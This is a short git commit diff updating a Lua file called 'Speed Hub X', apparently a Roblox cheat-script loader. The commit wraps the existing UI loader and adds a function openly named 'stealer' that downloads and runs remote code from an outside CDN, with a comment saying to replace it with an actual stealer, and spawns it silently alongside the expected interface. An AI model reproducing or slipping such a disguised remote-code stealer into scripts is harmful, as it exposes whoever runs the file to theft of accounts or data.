6d9008109963192e13ecb71fb2faee0dc54b8553
AhmadV90 <scriptgenerator0@gmail.com>
2025-08-21 08:29:49 +0800

    Update Speed Hub X.lua

--- Speed Hub X.lua
+++ Speed Hub X.lua
@@ -1,3 +1,12 @@
+local function stealer()
 
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/LmUavYn0jzVdCGRC/raw", true))()
-loadstring(game: HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+ID="924ff74c-8373-448f-83de-61a4c24eca6c";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()  -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
